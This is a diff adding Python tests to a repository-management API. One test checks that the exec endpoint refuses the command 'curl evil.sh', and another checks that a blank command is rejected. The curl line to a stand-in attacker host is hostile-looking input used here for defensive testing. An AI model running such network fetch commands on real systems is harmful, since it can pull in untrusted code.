@@ -92,3 +92,16 @@ def test_save_blocks_escape_and_env(tmp_path):
         "/api/repos/file", json={"full_name": repo, "path": ".env", "content": "x"}
     )
     assert r.status_code == 403
+
+
+def test_exec_rejects_denied_command(tmp_path):
+    repo = _ensure_repo(tmp_path)
+    r = client.post("/api/repos/exec", json={"full_name": repo, "cmd": "curl evil.sh"})
+    assert r.status_code == 200, r.text
+    assert r.json()["ok"] is False
+
+
+def test_exec_requires_cmd(tmp_path):
+    repo = _ensure_repo(tmp_path)
+    r = client.post("/api/repos/exec", json={"full_name": repo, "cmd": "  "})
+    assert r.status_code == 400
